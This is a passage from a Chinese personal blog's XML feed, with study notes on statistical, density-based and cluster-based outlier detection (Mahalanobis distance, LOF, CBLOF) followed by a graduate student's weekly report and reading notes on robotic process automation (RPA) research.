的马哈拉诺比斯距离为： $$M D i s t(o, \bar{o})=(o-\bar{o})^{T} S^{-1}(o-\bar{o})$$ ,S是协方差矩阵。 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>M</mi><mi>D</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo>(</mo><mi>o</mi><mo>,</mo><mover><mi>O</mi><mo>&#xAF;</mo></mover><mo>)</mo></math>是一元变量，于是可以对它进行Grubb检验，如果<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>M</mi><mi>D</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo>(</mo><mi>o</mi><mo>,</mo><mover><mi>O</mi><mo>&#xAF;</mo></mover><mo>)</mo></math>设定为离群点的阈值，则 $o$ 是为离群点。</p><blockquote><p><font color="#DD7ADF">补充知识：</font><a href="https://blog.zuishuailcq.xyz/2021/05/26/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5/">协方差矩阵 | 吾辈之人，自当自强不息！</a><br><font color="#2C7D82">协方差矩阵：</font>计算样本不同维度之间的协方差<br><font color="#348A8A">协方差：</font>一般用来刻画两个随机变量的相似程度</p></blockquote><blockquote><p><font color="#F27611">补充知识：</font><strong>欧氏距离</strong>—–又称欧几里得距离<br>m维空间中两个点之间的真实距离<br>例如二维空间的公式：<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3C1;</mi><mo>=</mo><msqrt><msup><mfenced><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>-</mo><msub><mi>x</mi><mn>1</mn></msub></mrow></mfenced><mn>2</mn></msup><mo>+</mo><msup><mfenced><mrow><msub><mi>y</mi><mn>2</mn></msub><mo>-</mo><msub><mi>y</mi><mn>1</mn></msub></mrow></mfenced><mn>2</mn></msup></msqrt></math>，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3C1;</mi></math> 为点 <math xmlns="http://www.w3.org/1998/Math/MathML"><mfenced><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow></mfenced></math>与点 <math xmlns="http://www.w3.org/1998/Math/MathML"><mfenced><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>y</mi><mn>1</mn></msub></mrow></mfenced></math>之间的欧氏距离</p></blockquote><blockquote><p><font color="#4D74F2">补充知识：</font><strong>马哈拉诺比斯距离</strong><br>表示数据的协方差距离，它是一种有效的计算两个未知样本集的相似度的方法。<br><strong>思路</strong>：</p><ul><li>将变量按照主成分进行旋转，消除维度间的相关性</li><li>对向量和分布进行标准化，让各个维度同为标准正态分布</li></ul></blockquote><ol start="2"><li><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>&#x3C7;</mi><mn>2</mn></msup></math><strong>统计量</strong>的多元离群点检测</li></ol><p>  正态分布的假定下，<math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>&#x3C7;</mi><mn>2</mn></msup></math>  统计量也可以用来捕获多元离群点，对象 $o$ ，<math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>&#x3C7;</mi><mn>2</mn></msup></math>  统计量是：<br>  <math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>&#x3C7;</mi><mn>2</mn></msup><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><msup><mfenced><mrow><msub><mi>o</mi><mi>i</mi></msub><mo>-</mo><msub><mi>E</mi><mi>i</mi></msub></mrow></mfenced><mn>2</mn></msup><msub><mi>E</mi><mi>i</mi></msub></mfrac></math></p><blockquote><p><font color="#6B6B6B">统计量：</font><br>是样本测量的一种<em>属性</em>。类似计算样本的平均值。</p></blockquote><p><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>O</mi><mi>i</mi></msub></math>是$o$在第 $i$ 维上的值，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>E</mi><mi>i</mi></msub></math>是所有对象在第 $i$ 维上的均值，而n是是维度。如果对象的 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3C7;</mi><mn>2</mn></math>统计量很大，则对象是离群点。</p><ol start="3"><li>混合参数分布检测离群</li></ol><p>  当实际数据很复杂时，假定服从正态分布的话会不太合适，这种情况下假定数据是被混合参数分布产生的。</p><blockquote><p><font color="#1076FF">补充知识：</font><strong>混合分布</strong><br>在概率与统计中，如果我们有一个包含多个随机变量的随机变量集合，再基于该集合生成一个新的随机变量，则该随机变量的分布称为混合分布(mixture distribution)。<br><font color="red">TODO:</font>查阅了<a href="https://blog.csdn.net/tanghonghanhaoli/article/details/90543917">混合分布</a>的三个性质没有理解如何判定离群 </p></blockquote><h4 id="非参数方法—壹"><a href="#非参数方法—壹" class="headerlink" title="非参数方法—壹"></a>非参数方法—壹</h4><p><font color="#DD7ADF">构造直方图</font></p><p>为了构造一个好的直方图，用户必须指定直方图的类型和其他参数（箱数、等宽or等深）。最简单的方法是，如果该对象落入直方图的一个箱中，则该对象被看做正常的，否则被认为是离群点。也可以使用直方图赋予每个对象一个离群点得分，比如对象的离群点得分为该对象落入的箱的容积的倒数。</p><h4 id="非参数方法—贰"><a href="#非参数方法—贰" class="headerlink" title="非参数方法—贰"></a>非参数方法—贰</h4><p><font color="#DD7ADF"><a href="https://blog.csdn.net/pipisorry/article/details/53635895">核密度估计</a></font></p><blockquote><p> <font color="#B22222">补充知识：</font><br> <strong>向量的内积与外积</strong><br> 对于向量a和向量b：<br> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi><mo>=</mo><mfenced close="]" open="["><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>,</mo><mo>&#x2026;</mo><mo>&#xB7;</mo><msub><mi>a</mi><mi>n</mi></msub></mrow></mfenced></math><br> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>b</mi><mo>=</mo><mfenced close="]" open="["><mrow><msub><mi>b</mi><mn>1</mn></msub><mo>,</mo><msub><mi>b</mi><mn>2</mn></msub><mo>,</mo><mo>&#x2026;</mo><mo>,</mo><msub><mi>b</mi><mi>n</mi></msub></mrow></mfenced></math><br> <font color="#00FFFF">内积</font><br> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi><mo>&#x2219;</mo><mi>b</mi><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><mo>&#x2026;</mo><mo>+</mo><msub><mi>a</mi><mi mathvariant="normal">n</mi></msub><msub><mi>b</mi><mi>n</mi></msub></math>，内积的几何意义是可以用来表征【信息在头脑中的呈现方式】或计算两个向量之间的夹角，以及在b向量在a向量方向上的投影。<br><font color="#FF8C00">外积</font><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi><mo>&#xD7;</mo><mi>b</mi><mo>=</mo><mfenced close="|" open="|"><mtable columnalign="left"><mtr><mtd><mi>i</mi></mtd><mtd><mi>j</mi></mtd><mtd><mi>k</mi></mtd></mtr><mtr><mtd><msub><mi>x</mi><mn>1</mn></msub></mtd><mtd><msub><mi>y</mi><mn>1</mn></msub></mtd><mtd><msub><mi>z</mi><mn>1</mn></msub></mtd></mtr><mtr><mtd><msub><mi>x</mi><mn>2</mn></msub></mtd><mtd><msub><mi>y</mi><mn>2</mn></msub></mtd><mtd><msub><mi>z</mi><mn>2</mn></msub></mtd></mtr></mtable></mfenced><mo>=</mo><mfenced><mrow><msub><mi>y</mi><mn>1</mn></msub><msub><mi>z</mi><mn>2</mn></msub><mo>-</mo><msub><mi>y</mi><mn>2</mn></msub><msub><mi>z</mi><mn>1</mn></msub></mrow></mfenced><mi>i</mi><mo>-</mo><mfenced><mrow><msub><mi>x</mi><mn>1</mn></msub><msub><mi>z</mi><mn>2</mn></msub><mo>-</mo><msub><mi>x</mi><mn>2</mn></msub><msub><mi>z</mi><mn>1</mn></msub></mrow></mfenced><mi>j</mi><mo>+</mo><mfenced><mrow><msub><mi>x</mi><mn>1</mn></msub><msub><mi>y</mi><mn>2</mn></msub><mo>-</mo><msub><mi>x</mi><mn>2</mn></msub><msub><mi>y</mi><mn>1</mn></msub></mrow></mfenced><mi>k</mi></math>，外积的结果是一个向量，更为熟知的叫法是法向量，该向量垂直于a和b向量构成的平面。</p></blockquote><p>把每个观测对象看作一个周围区域中的高概率密度指示子，一个点上的概率密度依赖于该点到观测对象的距离，使用核函数对样本点对其邻域的影响建模。核函数K()满足以下两个条件：</p><ol><li><math xmlns="http://www.w3.org/1998/Math/MathML"><msubsup><mo>&#x222B;</mo><mrow><mo>-</mo><mo>&#x221E;</mo></mrow><mo>&#x221E;</mo></msubsup><mi>K</mi><mo>(</mo><mi>u</mi><mo>)</mo><mi>d</mi><mi>u</mi><mo>=</mo><mn>1</mn></math></li><li>对于所有的 $u$ 值，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi><mo>(</mo><mo>-</mo><mi>u</mi><mo>)</mo><mo>=</mo><mi>K</mi><mo>(</mo><mi>u</mi><mo>)</mo></math></li></ol><p> 一个频繁使用的核函数是标准高斯函数：<br> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi><mfenced><mfrac><mrow><mi>x</mi><mo>-</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><mi>h</mi></mfrac></mfenced><mo>=</mo><mfrac><mn>1</mn><msqrt><mn>2</mn><mi>&#x3C0;</mi></msqrt></mfrac><msup><mi>e</mi><mrow><mo>-</mo><mfrac><msup><mfenced><mrow><mi>x</mi><mo>-</mo><msub><mi>x</mi><mi>i</mi></msub></mrow></mfenced><mn>2</mn></msup><mrow><mn>2</mn><msup><mi>h</mi><mn>2</mn></msup></mrow></mfrac></mrow></msup></math></p><blockquote><p><font color="#3B4B6E">补充知识：</font>高斯函数<br>一维形式<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>f</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>=</mo><mi>a</mi><msup><mi>e</mi><mrow><mo>-</mo><mfrac><mrow><mo>(</mo><mi>x</mi><mo>-</mo><mi>b</mi><msup><mo>)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>c</mi><mn>2</mn></msup></mrow></mfrac></mrow></msup></math><br>a是曲线尖峰的高度，b是尖峰中心的坐标，c称为标准方差<br><img src="http://files.shanqianche.cn/2021530/1622339515069.png" alt="高斯函数"></p><p><font color="#DD7ADF">二维高斯核函数</font>常用于高斯模糊Gaussian Blur，在数学领域，主要是用于解决热力方程和扩散方程，以及定义Weiertrass Transform<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>f</mi><mo>(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>)</mo><mo>=</mo><mi>A</mi><mi>exp</mi><mfenced><mrow><mo>-</mo><mfenced><mrow><mfrac><msup><mfenced><mrow><mi>x</mi><mo>-</mo><msub><mi>x</mi><mi>o</mi></msub></mrow></mfenced><mn>2</mn></msup><mrow><mn>2</mn><msubsup><mi>&#x3C3;</mi><mi>x</mi><mn>2</mn></msubsup></mrow></mfrac><mo>+</mo><mfrac><msup><mfenced><mrow><mi>y</mi><mo>-</mo><msub><mi>y</mi><mi>o</mi></msub></mrow></mfenced><mn>2</mn></msup><mrow><mn>2</mn><msubsup><mi>&#x3C3;</mi><mi>y</mi><mn>2</mn></msubsup></mrow></mfrac></mrow></mfenced></mrow></mfenced></math><br>A是幅值，x。y。是中心点坐标，σx σy是方差，图示如下，A = 1, xo = 0, yo = 0, σx = σy = 1<br><img src="http://files.shanqianche.cn/2021530/1622340032183.png" alt="二维高斯函数"></p></blockquote><p>设 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><mo>&#x2026;</mo><mo>,</mo><msub><mi>x</mi><mi>n</mi></msub></math> 是随机变量 $f$ 的独立同分布样本，那么概率密度函数的核函数近似为：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mover><mi>f</mi><mo>^</mo></mover><mi>h</mi></msub><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mi>h</mi></mrow></mfrac><munderover><mo>&#x2211;</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>K</mi><mfenced><mfrac><mrow><mi>x</mi><mo>-</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><mi>h</mi></mfrac></mfenced></math>,K()是核函数，h是带宽,充当光滑参数</p><p>对于对象 $o$ ， <math xmlns="http://www.w3.org/1998/Math/MathML"><mover><mi>f</mi><mo>^</mo></mover><mo>(</mo><mi>o</mi><mo>)</mo></math> 给出该对象被随机过程中产生的估计概率。如果 <math xmlns="http://www.w3.org/1998/Math/MathML"><mover><mi>f</mi><mo>^</mo></mover><mo>(</mo><mi>o</mi><mo>)</mo></math> 过小，$o$  可能是离群点。</p><h3 id="基于邻近性的方法"><a href="#基于邻近性的方法" class="headerlink" title="基于邻近性的方法"></a>基于邻近性的方法</h3><p>假定一个对象是离群点，如果在特征空间中的最近邻也远离它，即该对象与它的最近邻之间的邻近性显著地偏离数据集中其他对象与它们的近邻之间的邻近性。</p><p>基于邻近性的方法的有效性高度依赖与所使用的邻近性度量，主要有<strong>基于距离</strong>和<strong>基于密度</strong>的离群点检测方法。</p><p><font color="#7FFF00">通俗理解，</font>离群点与近邻点的近邻距离明显大于其它对象与其的近邻的距离。即离群点周边环境明显和其它对象不一样。</p><h4 id="基于距离的离群点检测"><a href="#基于距离的离群点检测" class="headerlink" title="基于距离的离群点检测"></a>基于距离的离群点检测</h4><p>对象给定半径的邻域，如果它的邻域内没有足够多的其他点，则该点被认为是离群点。</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mfenced close="||" open="||"><mfenced close="}" open="{"><mrow><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2223;</mo><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msup><mi>o</mi><mo>‘</mo></msup></mrow></mfenced><mo>&#x2264;</mo><mi>r</mi></mrow></mfenced></mfenced></mrow><mrow><mo>&#x2016;</mo><mi>D</mi><mo>&#x2016;</mo></mrow></mfrac><mo>&#x2264;</mo><mi>&#x3C0;</mi></math></p><p><font color="#228B22">r是距离阈值</font>，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3C0;</mi></math>  是分数阈值，对象 $o$ 如果满足上面的式子则是一个  离群点。</p><h4 id="基于密度的离群点检测"><a href="#基于密度的离群点检测" class="headerlink" title="基于密度的离群点检测"></a>基于密度的离群点检测</h4><p>基于距离的检测方法从全局考虑数据集，所找到的离群点都是<strong>全局离群点</strong>，但实际上数据结构更复杂，对象<font color="#8FBC8F">可能</font>关于其局部邻域，而<font color="#8FBC8F">不是</font>整个数据分布而视为离群点。</p><p>基于密度的离群点检测方法基本假定为：<strong>非离群点对象周围的密度与其邻域周围的密度类似，而离群点对象周围的密度显著不同于其邻域周围的密度。</strong></p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo><mo>=</mo><mfenced close="}" open="{"><mrow><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2223;</mo><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2208;</mo><mi>D</mi><mo>,</mo><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msup><mi>o</mi><mo>‘</mo></msup></mrow></mfenced><mo>&#x2264;</mo><msub><mo>dist</mo><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></mfenced></math></p><p>D为数据集，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mo>dist</mo><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></math>  是对象o第k个近邻的对象之间的距离，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></math>  是所有在<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mo>dist</mo><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></math> 之内的对象集。可以使用 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></math> 中的对象到o的平均距离作为局部密度的度量，但是为了避免比如有非常近的近邻使得距离度量统计产生波动，需要加上光滑效果：<br>$reachdist$<math xmlns="http://www.w3.org/1998/Math/MathML"><mmultiscripts><mfenced><mrow><mi>o</mi><mo>&#x2190;</mo><msup><mi>o</mi><mo>‘</mo></msup></mrow></mfenced><mprescripts/><mi>k</mi><none/></mmultiscripts><mo>=</mo><mi>max</mi><mfenced close="}" open="{"><mrow><msub><mo>dist</mo><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo><mo>,</mo><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msup><mi>o</mi><mo>‘</mo></msup></mrow></mfenced></mrow></mfenced></math><br>k是用户指定参数，控制光滑效果。对象o的局部密度为：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi><mi>r</mi><msub><mi>d</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo><mo>=</mo><mfrac><mfenced close="||" open="||"><mrow><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></mfenced><mrow><msub><mo>&#x2211;</mo><mrow><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2208;</mo><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></msub><msub><mtext>&#xA0;reachdist&#xA0;</mtext><mi>k</mi></msub><mfenced><mrow><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2190;</mo><mi>o</mi></mrow></mfenced></mrow></mfrac></math><br>o的局部离群点因子为：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>L</mi><mi>O</mi><msub><mi>F</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo><mo>=</mo><mfrac><mrow><msub><mo>&#x2211;</mo><mrow><msup><mi>o</mi><mo>‘</mo></msup><mo>&#x2208;</mo><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></msub><mfrac><mrow><msub><mo>lrd</mo><mi>k</mi></msub><mfenced><msup><mi>o</mi><mo>‘</mo></msup></mfenced></mrow><mrow><msub><mo>lrd</mo><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></mfrac></mrow><mfenced close="||" open="||"><mrow><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>o</mi><mo>)</mo></mrow></mfenced></mfrac></math><br>局部离群点因子是o的可达密度与o的k-最近邻可达密度之比的平均值。对象o的局部可达密度越低，并且o的k-最近邻局部可达密度越高，LOF值越高。</p><p><font color="#B8860B">LOF 的思想：</font><br>通过比较每个点 p 和其邻域点的密度来判断该点是否为异常点，如果点 p 的密度越低，越可能被认定是异常点。至于这个密度，是通过点之间的距离来计算的，点之间距离越远，密度越低，距离越近，密度越高，而且这里的密度不是基于全局数据，而是基于局部数据。</p><h3 id="基于聚类的方法"><a href="#基于聚类的方法" class="headerlink" title="基于聚类的方法"></a>基于聚类的方法</h3><p>假定<font color="#556B2F">正常数据</font>对象属于大的、稠密的簇、而<font color="#556B2F">离群点</font>属于小或稀疏的簇，或者不属于任何簇。直截了当的采用聚类方法用于离群点检测开销会很大，不能很好地扩展到大数据集上。</p><ol><li>将离群点检测为不属于任何簇的对象</li><li>最近簇距离的离群点检测</li></ol><blockquote><p>假设o到最近的簇中心为 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>c</mi><mi>o</mi></msub></math> ,则o与 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>c</mi><mi>o</mi></msub></math> 之间的距离为 <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msub><mi>c</mi><mi>o</mi></msub></mrow></mfenced></math> ， <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>c</mi><mi>o</mi></msub></math> 与指派到 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>c</mi><mi>o</mi></msub></math> 这个簇中的对象之间的平均距离为 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>l</mi><msub><mi>c</mi><mi>o</mi></msub></msub></math> ，比率 <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msub><mi>c</mi><mi>o</mi></msub></mrow></mfenced></mrow><msub><mi>l</mi><msub><mi>c</mi><mi>o</mi></msub></msub></mfrac></math> 度量 <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>dist</mo><mfenced><mrow><mi>o</mi><mo>,</mo><msub><mi>c</mi><mi>o</mi></msub></mrow></mfenced></math> 与平均值的差异程度。</p></blockquote><ol start="3"><li>识别小簇或稀疏簇</li></ol><blockquote><p>先是找出数据集中的簇，并把它们按照大小降序排列，假定大部分数据点都不是离群点。它使用一个参数<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3B1;</mi><mo>(</mo><mn>0</mn><mo>&#x2264;</mo><mi>&#x3B1;</mi><mo>&#x2264;</mo><mn>1</mn><mo>)</mo></math>  区别大小簇。任何至少包含数据集中 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3B1;</mi><mo>%</mo></math> 数据点的簇都被视为大簇，其余为小簇。然后对每个数据点赋予基于簇的局部离群点因子(CBLOF)。对于属于大簇的点，它的CBLOF是簇的大小与该点与簇的相似性的乘积。对于小簇的点，其CBLOF用小簇的大小和该点与最近的大簇的相似性乘积计算。<br>CBLOF代表点属于簇的概率，值越大，点与簇越相似。远离任何大簇的小簇被看作离群点组成，并且具有最低CBLOF值的点怀疑为离群点。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>LOF类的算法适用于局部区域空间问题，对于完整区域空间，KNN和Iforest更好。</li><li>KNN每次运行需要遍历所有数据，所以效率比较低，如果效率要求比较高，用聚类方法更好。</li><li>传统机器学习算法中Iforest、KNN和OCSVM表现较好，基于深度学习的算法准确率在论文中更好！</li><li>对于不同种类的数据，没有哪一种算法是最好的，HBOS算法在某些数据集上的表现非常好，且运算速度很快。</li><li>当数据特征数很多时，如400个特征，只有KNN表现还不错，Iforest表现也不好，因为特征选取的随机性，可能无法覆盖足够多的特征（不绝对）。</li><li>ABOD综合效果最差，尽量不要用。</li></ol>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> machine learning </tag>
            
            <tag> data mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-05-15【Week】</title>
      <link href="/2021/05/19/2021-05-15%E3%80%90Week%E3%80%91/"/>
      <url>/2021/05/19/2021-05-15%E3%80%90Week%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h3 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h3><ul><li><input disabled="" type="checkbox"> 源码分析</li><li><input disabled="" type="checkbox"> 预开题准备</li><li><input disabled="" type="checkbox"> 重新整理并寻找合适的研究点</li></ul><h3 id="任务完成情况"><a href="#任务完成情况" class="headerlink" title="任务完成情况"></a>任务完成情况</h3><ol><li>源码分析已经完成，tagui的源码的难点主要是语言多，但是其中逻辑不是很难</li><li>这次预开题，我是比较认真准备的，当时讲的时候人比较多，可能比较着急哇，我主要为了解决RPA中可并发执行任务的功能，这块的难点就是资源分配的问题，所以涉及了大量资源分配的研究，目前国内外RPA这方面都比较淡化，没有很好的解决方式，所以我感觉还是可以的：）</li><li>现在在看老师给发的文档，大部分我也看过了，里面的点太笼统，面太大，当时和老师交流后，重新理解了一下，是研究机器学习在业务流程中处理文档，表格，但是目前就RPA里面来说，自动获取文件中信息处理的比较好，各个公司都没有在这块上投入更多资源</li></ol><h3 id="汇总文件补充"><a href="#汇总文件补充" class="headerlink" title="汇总文件补充"></a>汇总文件补充</h3><blockquote><p>平时学习时，总结都是单独的，所以这块就引用上周写的汇总了</p></blockquote><ol><li>tagui源码分析</li></ol><p><img src="./attachments/TagUI%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%8F%8A%E5%88%86%E6%9E%90.pdf" alt="TagUI源码阅读及分析"></p><ol start="2"><li>预开题PPT</li></ol><p><img src="./attachments/RPA%E5%8A%A8%E6%80%81%E6%84%9F%E7%9F%A5%E5%88%86%E9%85%8D%E4%B8%9A%E5%8A%A1%E8%B5%84%E6%BA%90%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8.pptx" alt="RPA动态感知分配业务资源的研究与应用"></p><ol start="3"><li>重新整理—未完成</li></ol><p><img src="./attachments/RPA+AI.pdf" alt="RPA+AI"></p>]]></content>
      
      
      <categories>
          
          <category> weekly report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> report </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RPA+AI</title>
      <link href="/2021/05/17/RPA+AI/"/>
      <url>/2021/05/17/RPA+AI/</url>
      
        <content type="html"><![CDATA[<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://developer.aliyun.com/group/rpa?spm=a2c6h.12873639.0.0.65b05d65mS6OlC#/?_k=agnoe0">阿里云RPA社区</a></p><p><a href="https://zhuanlan.zhihu.com/p/59034887?utm_oi=786717341600858112">阿里云RPA（机器人流程自动化）系列</a></p><p><a href="https://www.yuque.com/aliyun_rpa">阿里云RPA文档</a></p><p><a href="https://github.com/rpabotsworld/awesome-rpa">资源</a></p><h2 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h2><h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><h4 id="阿里云RPA系列"><a href="#阿里云RPA系列" class="headerlink" title="阿里云RPA系列"></a>阿里云RPA系列</h4><ol><li>文件信息的处理–提取和处理结构和半结构化数据</li><li>异常处理–宕机、流程回滚、中断后的流程接续等问题</li><li>业务流程从明确化变为高适配的—智能处理【制定与运行过程中】</li><li>各类场景–大量重复【基本配置通用性高】、可贴合各类场景【规则灵活，外附组件可灵活配置】</li></ol><h4 id="S公司智能财务机器人共享中心建设与实践"><a href="#S公司智能财务机器人共享中心建设与实践" class="headerlink" title="S公司智能财务机器人共享中心建设与实践"></a>S公司智能财务机器人共享中心建设与实践</h4><p><a href="https://m.hanspub.org/journal/paper/34237">URL</a></p><ol><li>分布式部署时，对于资源无法实时有效判断其是否有效可用</li><li>将robot集中到资源池中，供全公司使用，打破单元机器人的壁垒—无法有效的共享数据，但是安全受到了极大威胁</li></ol><h4 id="一种基于RPA机器人共享中心的自动审批的方法【专利】"><a href="#一种基于RPA机器人共享中心的自动审批的方法【专利】" class="headerlink" title="一种基于RPA机器人共享中心的自动审批的方法【专利】"></a>一种基于RPA机器人共享中心的自动审批的方法【专利】</h4><p><a href="http://www10.drugfuture.com/pdfview/generic/web/viewer.html?file=/cnpat/package/%E5%8F%91%E6%98%8E%E4%B8%93%E5%88%A9%E7%94%B3%E8%AF%B7%E8%AF%B4%E6%98%8E%E4%B9%A6CN201911335237.4.pdf">PDF</a></p><ol><li>没有实际创新点，就是为用户提供了访问权限，根据用户自己提交的内容，进行过滤分类，然后由robot进行访问对应的资源进行处理，专利只是讲了研究内容，具体算法和实践没有提到，所以它所涉及到的对机器人共享中心进行分级调度没有表现出来。</li></ol><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><blockquote><p>阿里云版本迭代</p></blockquote><p><img src="http://files.shanqianche.cn/2021517/1621238642819.png" alt="阿里云版本迭代方案"></p><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><ol><li>流程处理未知问题的智能化</li><li>中间通信安全</li><li>重新定义RPA，目前RPA，只是一个外接的控制工具，而不能替代人工</li><li>==* #F44336==挖掘业务流程，结合机器学习进行业务预测</li><li></li></ol><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>无数据比对，无证明方式，用数据证明有效改进</li></ol><p><a href="https://wap.cnki.net/touch/web/Dissertation/Article/10013-1019047248.nh.html">https://wap.cnki.net/touch/web/Dissertation/Article/10013-1019047248.nh.html</a></p><p><a href="https://www.touqikan.com/jsjj/660421.html">https://www.touqikan.com/jsjj/660421.html</a></p>]]></content>
      
      
      <categories>
          
          <category> RPA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> RPA </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TagUI源码阅读及分析</title>
      <link href="/2021/05/06/TagUI%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%8F%8A%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/06/TagUI%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%8F%8A%E5%88%86%E6%9E%90/</url>
      
